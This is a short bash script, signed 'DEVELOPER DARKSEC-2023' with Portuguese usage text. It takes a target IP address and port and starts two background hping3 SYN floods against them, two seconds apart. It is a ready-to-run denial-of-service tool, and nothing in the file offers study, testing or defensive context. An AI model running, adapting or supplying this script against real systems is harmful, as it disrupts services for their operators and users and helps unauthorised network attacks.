#!/bin/bash
# DEVELOPER DARKSEC

if [ "$1" == "" ]
then
	echo " DEVELOPER DARKSEC-2023"
	echo " USE DESSA FORMA : ./$0 <IP> <PORTA>"
else
hping3 -S --flood -V -p $2 $1 &
sleep 2
hping3 -S --flood -V -p $2 $1 &
fi

